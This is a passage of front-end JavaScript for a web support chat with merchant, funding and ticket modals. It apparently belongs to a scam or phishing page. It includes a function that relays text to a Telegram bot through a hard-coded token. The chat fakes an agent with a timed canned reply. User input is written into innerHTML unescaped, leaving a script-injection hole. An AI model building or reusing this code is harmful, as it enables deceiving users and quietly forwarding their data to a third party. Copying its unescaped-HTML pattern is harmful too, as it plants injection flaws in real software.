                            <img src="https://nlpgroup.vn/assets/upload/logo/xp1JaMv3VGGjm4OLvIkUPdeeaX63WF.webp" style="filter:invert(1); height: 16px;">
                        </div>
                        <div class="text-sm space-y-3">
                            <p><strong>DATE:</strong> ${new Date().toLocaleString()}</p>
                            <p><strong>MERCHANT:</strong> ${merchant}</p>
                            <p><strong>DEPARTMENT:</strong> ${supportRole}</p>
                            <div>
                                <strong>ISSUE DETAILS:</strong><br>
                                <div class="bg-gray-50 p-3 mt-2 border border-gray-300 whitespace-pre-wrap text-xs">${issue}</div>
                            </div>
                        </div>
                        <div class="mt-6 pt-3 border-t-2 border-black text-xs font-bold text-center uppercase">
                            ✓ Request received. Our technical team will respond shortly.
                        </div>
                    </div>
                </div>`;
                c.appendChild(d);
                c.scrollTop = c.scrollHeight;
            });
            
            // Reset form
            document.getElementById('sup-issue').value = '';
            closeModal('modal-support');
        }

        // --- UTILS ---
        function validateFields(ids) { let v=true; ids.forEach(id=>{const el=document.getElementById(id);if(!el.value.trim()){el.classList.add('input-error');v=false}else el.classList.remove('input-error')});return v; }
        function showBotTyping(d, f) { const c = document.getElementById('chat-messages'); const t = document.createElement('div'); t.className = 'flex justify-start animate__animated animate__fadeIn'; t.innerHTML = `<div class="flex max-w-[85%] md:max-w-[75%] gap-3"><div class="w-8 h-8 rounded-xl bg-slate-900 flex items-center justify-center flex-shrink-0"><img src="https://nlpgroup.vn/assets/upload/logo/xp1JaMv3VGGjm4OLvIkUPdeeaX63WF.webp" class="w-5 h-auto"></div><div class="p-4 rounded-2xl bg-white border border-slate-200 flex items-center gap-1.5 shadow-sm"><div class="typing-dot"></div><div class="typing-dot"></div><div class="typing-dot"></div></div></div>`; c.appendChild(t); c.scrollTop = c.scrollHeight; setTimeout(() => { t.remove(); if(f) f(); }, d); }
        function addMessage(type, text, isSelector = false) { const container = document.getElementById('chat-messages'); const msgDiv = document.createElement('div'); msgDiv.className = `flex ${type === 'user' ? 'justify-end' : 'justify-start'} animate__animated animate__fadeInUp animate__faster`; let content = isSelector ? `<div class="space-y-4"><p class="font-bold text-slate-700">${text}</p><div class="grid grid-cols-2 gap-3"><button onclick="selectLanguage('CN')" class="bg-slate-900 text-white py-3 rounded-xl font-bold transition-all hover:bg-black">中文 (CN)</button><button onclick="selectLanguage('EN')" class="bg-blue-600 text-white py-3 rounded-xl font-bold transition-all hover:bg-blue-700">English (EN)</button></div></div>` : `<span>${text}</span>`; const icon = type === 'user' ? `<div class="w-8 h-8 rounded-xl flex-shrink-0 flex items-center justify-center bg-blue-600 text-white"><i data-lucide="user" class="w-4 h-4"></i></div>` : `<div class="w-8 h-8 rounded-xl flex-shrink-0 flex items-center justify-center bg-slate-900 text-white"><img src="https://nlpgroup.vn/assets/upload/logo/xp1JaMv3VGGjm4OLvIkUPdeeaX63WF.webp" class="w-5 h-auto"></div>`; msgDiv.innerHTML = `<div class="flex max-w-[85%] md:max-w-[75%] ${type === 'user' ? 'flex-row-reverse' : 'flex-row'} gap-3">${icon}<div class="flex flex-col gap-1"><div class="p-4 rounded-2xl shadow-sm text-sm whitespace-pre-wrap ${type === 'user' ? 'bg-blue-600 text-white chat-bubble-user' : 'bg-white text-slate-800 border border-slate-200 chat-bubble-bot'}">${content}</div></div></div>`; container.appendChild(msgDiv); lucide.createIcons(); container.scrollTop = container.scrollHeight; }
        function copyToClipboard(t) { const ta = document.createElement("textarea"); ta.value = t; ta.style.position = "fixed"; ta.style.left = "-9999px"; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); }
        async function sendTelegram(t) { if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return; try { await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: t, parse_mode: 'HTML' }) }); } catch (e) {} }
        
        function openModal(id) { 
            document.getElementById(id).style.display = 'flex'; 
            if(id==='modal-finance') switchFinanceTab('FUND'); 
            if(id==='modal-support') setSupportCat('General'); 
            // Update lang context for new modals opened
            if (currentLang) updateLangUI(currentLang);
        }
        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
        
        document.getElementById('send-btn').onclick = () => {
            const input = document.getElementById('chat-input'), val = input.value.trim(); if(!val) return;
            addMessage('user', val); input.value = "";
            showBotTyping(2000, () => addMessage('bot', currentLang === 'CN' ? `已收到，<b>${userData.name}</b>。我们正在处理您的请求。` : `Received, <b>${userData.name}</b>. An agent will reply shortly.`));
        };